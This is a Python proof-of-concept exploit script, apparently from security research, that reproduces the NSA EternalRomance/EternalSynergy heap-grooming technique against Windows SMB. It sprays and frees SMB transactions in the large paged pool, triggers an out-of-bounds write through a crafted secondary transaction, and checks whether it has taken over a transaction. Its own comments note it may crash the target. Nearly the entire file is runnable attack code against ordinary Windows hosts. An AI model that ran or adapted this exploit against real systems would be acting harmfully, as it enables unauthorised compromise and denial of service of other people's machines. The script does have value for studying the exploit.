from mysmb import MYSMB
from impacket import smb
from struct import pack, unpack
import sys

'''
PoC: demonstrates how NSA eternalromance and eternalsynergy does the transaction alignment with large paged pool

Note:
- This method is less reliable than matched-pair method and has higher chance to crash a target
- I add this method to show how to spraying heap with large paged pool only

The exploit method uses only large paged pool for spraying heap. All transaction structs are at start of memory page.
The OOB write bug need to overwrite data on the next memory page. There are 2 cases to make the target crashes.
- The next memory page is invalid (page fault)
- The next memory page is other data structure

Comparing to matched-pair method, the OOB write always writes at valid memory address because the written address is in
same page as allocated transaction. Moreover, if the written address is not our transaction struct, it is likely to be
free chunk data (failed but not crash the target).
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 3:
	print("{} <ip> <pipe_name>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = sys.argv[2]

conn = MYSMB(target)
conn.login(USERNAME, PASSWORD)

tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
conn.set_default_tid(tid)

tid2 = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
fid = conn.nt_create_andx(tid, pipe_name)

print('Sending 50 frag packets (25 to free)')
# paged pool size 0x8000 ... 0xc000
for i in range(5):
	for j in range(7, 0xc):
		size = (j * 0x1000) + 0xe00
		conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=size, maxDataCount=0)
		conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=size, maxDataCount=0, tid=tid2)

# 
conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=0x7e00, maxDataCount=0)
conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=0x7e00, maxDataCount=0, tid=tid2)

# free 25+1 transactions (create 25 holes)
conn.disconnect_tree(tid2)

print('Sending 40 padding packets')
# fill all large holes (size >= 0x10000)
for i in range(40):
	conn.send_trans(pack('<HH', 0x36, fid), totalDataCount=0xfe80, maxDataCount=0)

# Hope no hole for large paged pool left
reqs = []
for i in range(7):
	mid = fid if i == 2 else None
	reqs.append(conn.create_trans_packet(pack('<HH', 0x36, fid), mid=mid, totalDataCount=0xfe80, maxDataCount=0))
conn.send_raw(''.join(reqs))
for i in range(7):
	conn.recvSMB()

# smb write raw named pipe
conn.do_write_andx_raw_pipe(fid, 'A'*512)

# OOB write
conn.send_trans_secondary(fid, data='\x00\x00', dataDisplacement=0xfdc0)

# test OOB write result by sending a secondary with mid=0 and bad data displacement
conn.send_trans_secondary(0, data='\x00', dataDisplacement=0xffff)
# if success, the target must reply an error
# if no reply, fail
recvPkt = conn.recvSMB()

if recvPkt.getNTStatus() != 0:
	print('Successfully took over a transaction')
else:
	print('Fail to took over a transaction')

conn.disconnect_tree(tid)
conn.logoff()
conn.get_socket().close()
